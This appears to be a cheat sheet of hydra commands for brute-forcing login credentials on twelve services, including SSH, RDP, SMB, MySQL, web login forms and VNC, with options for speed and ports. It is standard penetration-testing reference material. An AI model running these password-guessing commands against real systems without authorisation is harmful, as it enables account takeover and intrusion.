
hydra is a popular brute-force tool used to test login credentials on various network services. Below are common usage examples for various services.

---

### 1. **[[FTP]] Brute Force**

```bash
hydra -l username -P /path/to/passwords.txt ftp://target_ip
```

- `-l username`: Single username.
- `-P /path/to/passwords.txt`: Path to the password list.
- `ftp://target_ip`: Specifies the FTP service and target.

---

### 2. **[[SSH]] Brute Force**

```bash
hydra -l username -P /path/to/passwords.txt ssh://target_ip
```

- Use the `ssh` protocol to target port 22 (default for SSH).

---

### 3. **[[Telnet]] Brute Force**

```bash
hydra -l username -P /path/to/passwords.txt telnet://target_ip
```

- Targets Telnet on the default port.

---

### 4. **HTTP Basic Authentication**

```bash
hydra -l username -P /path/to/passwords.txt http://target_ip
```

- For HTTP basic authentication endpoints.

---

### 5. **HTTP Form Authentication**

```bash
hydra -l username -P /path/to/passwords.txt target_ip http-post-form "/login:username=^USER^&password=^PASS^:Invalid login"
```

- `/login`: Path to the login form.
- `username=^USER^&password=^PASS^`: Fields in the form.
- `Invalid login`: String indicating a failed login attempt.

---

### 6. **[[MySQL]] Brute Force**

```bash
hydra -l root -P /path/to/passwords.txt mysql://target_ip
```

- Targets MySQL database authentication.

---

### 7. **[[RDP]] Brute Force**

```bash
hydra -l administrator -P /path/to/passwords.txt rdp://target_ip
```

- Brute-forces Remote Desktop Protocol (RDP).

---

### 8. **[[SMB (139, 445)]] Brute Force**

```bash
hydra -l username -P /path/to/passwords.txt smb://target_ip
```

- Tests SMB (Server Message Block) shares.

---

### 9. **POP3 Brute Force**

```bash
hydra -l username -P /path/to/passwords.txt pop3://target_ip
```

- Targets the POP3 service for email authentication.

---

### 10. **[[SMTP]] Brute Force**

```bash
hydra -l username -P /path/to/passwords.txt smtp://target_ip
```

- Tests SMTP authentication.

---

### 11. **LDAP Brute Force**

```bash
hydra -l username -P /path/to/passwords.txt ldap://target_ip
```

- LDAP directory authentication brute-forcing.

---

### 12. **VNC Brute Force**

```bash
hydra -P /path/to/passwords.txt vnc://target_ip
```

- Only requires a password list (`-P`) since VNC doesn’t use usernames by default.

---

## **Notes**

- **Adjusting Options**:
    - `-t`: Number of parallel tasks (e.g., `-t 16`).
    - `-vV`: Verbose output to display each attempt.
    - `-o`: Save output to a file (e.g., `-o results.txt`).

- **Custom Ports**: Use `-s` to specify a non-default port (e.g., `-s 8080` for HTTP.